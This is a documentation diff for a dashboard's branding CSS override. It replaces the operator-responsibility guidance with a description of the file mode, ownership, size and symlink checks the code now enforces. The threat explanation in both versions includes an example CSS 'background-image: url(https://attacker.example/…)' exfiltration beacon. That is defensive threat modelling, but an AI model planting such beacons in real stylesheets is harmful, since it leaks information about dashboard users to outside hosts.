@@ -114,9 +114,10 @@ Step 2 depends on step 1, which is the part that surprises people: setting only
 `HIVE_BRANDING_CSS` **also relocates `branding.json`** to sit beside it. Set
 both explicitly whenever the two files do not live together.
 
-Each variable is a full path to a **file**, not a directory. Both are read with
-a plain file read; a missing file is silently ignored, and invalid JSON is
-logged as a warning and treated as absent — branding can never break startup.
+Each variable is a full path to a **file**, not a directory. A missing file is
+silently ignored, and invalid JSON is logged as a warning and treated as absent
+— branding can never break startup. Both reads are subject to the
+[safety guards](#what-the-code-enforces) below.
 
 ### Example: read-only `/data`, branding from a Secret
 
@@ -151,37 +152,49 @@ pod roll; `custom.css` is re-read per request and takes effect on reload — but
 a projected Secret volume can lag the API object by up to the kubelet sync
 period, so "reload and it changed" is not instantaneous here.
 
-### Operator responsibilities
+### What the code enforces
 
-The branding path is a **trust boundary**, and the code does not police it. As
-shipped, `handleBrandingCSS` reads whatever file the resolved path names and
-writes it to the operator's browser as `text/css`. There is **no ownership
-check, no file-mode check, and no size bound** — the only hardening on the
-response is `X-Content-Type-Options: nosniff` and `Cache-Control: no-cache`.
-That places three obligations on you:
+The branding path is a **trust boundary**: whoever can write these files injects
+CSS into the operator's dashboard, and the dashboard CSP is
+`img-src 'self' data: https:`, so a stylesheet can beacon out — a
+`background-image: url(https://attacker.example/…)` on a selector that matches
+only under some condition turns a page view into a signal. This matters because
+the default `<data>/branding/` sits on the same volume as `agents_dir`, which
+agents write to.
 
-- **Keep the branding path operator-owned, never agent-writable.** The default
-  `<data>/branding/` sits on the same volume as `agents_dir`, which agents
-  write to. On a deployment where an agent process can create files under the
-  data volume root, an agent that drops a `branding/custom.css` gets its CSS
-  injected into the operator dashboard. Either place the directory outside any
-  agent-writable tree using the variables above, or make it root-owned and
-  mode `0555` so agents cannot create or replace files in it.
-- **Treat CSS as an exfiltration channel, not just cosmetics.** The dashboard
-  CSP is `img-src 'self' data: https:`, so a stylesheet can reference an
-  arbitrary `https:` URL — a `background-image: url(https://attacker.example/…)`
-  on a selector that only matches when some element is present turns a page
-  view into a beacon. This is why the writer of the file must be as trusted as
-  the operator reading the dashboard.
-- **Bound the file yourself.** Nothing caps the stylesheet's size; the whole
-  file is read into memory on every request for `/branding/custom.css`. A large
-  file on a hot path is a self-inflicted memory and bandwidth cost.
+Both files are therefore checked before they are read, and a file that fails any
+check is **refused, not partially applied**. `custom.css` 404s exactly as if it
+were absent, and `branding.json` falls back to the shipped defaults; the reason
+is logged once, with the path and the fix, rather than returned to the browser:
 
-Note the contrast with the unrelated [custom stylesheets](custom-stylesheets.md)
-feature (`?style=owner/repo/path.css`), which fetches from public GitHub, caps
-the body at 128 KiB, sanitises the CSS, and scopes it to a root element. The
-branding override does **none** of that — it is deliberately a raw operator
-escape hatch, and its safety comes entirely from who can write the file.
+| Check | Refused when |
+|---|---|
+| **Mode** | the file is group- or world-writable (`chmod go-w` to fix) |
+| **Ownership** | the owner is neither the hive process user nor `root` |
+| **Size** | the file exceeds 128 KiB — refused outright, never truncated |
+| **Symlink** | the path is a symlink resolving outside its own directory |
+
+Two deliberate allowances, both so that hardened deployments keep working:
+
+- **`root`-owned files pass.** The read-only Secret mount
+  [above](#example-read-only-data-branding-from-a-secret) is `uid 0`,
+  `defaultMode 0444` — the most hardened shape, and one the process cannot
+  rewrite. Refusing it would have punished the recommended setup.
+- **Symlinks *within* the branding directory pass.** Kubernetes projected
+  volumes are built entirely out of them (the mount is a tree of links into
+  `..data/`), so rejecting symlinks outright would break every ConfigMap and
+  Secret mount.
+
+`HIVE_BRANDING_ALLOW_UNSAFE_OWNER=true` waives **only** the ownership check, for
+deployments whose files are legitimately owned by some third uid. It does not
+waive the mode check — group- or world-writable has no legitimate shape here.
+
+What remains yours: **the guards check who can write the file, not what is in
+it.** A stylesheet written by a trusted owner is still served verbatim. Note the
+contrast with the unrelated [custom stylesheets](custom-stylesheets.md) feature
+(`?style=owner/repo/path.css`), which also *sanitises* the CSS and scopes it to a
+root element. The branding override shares its 128 KiB cap but does neither of
+those — it is deliberately a raw operator escape hatch.
 
 ### CSP and the strings file
 
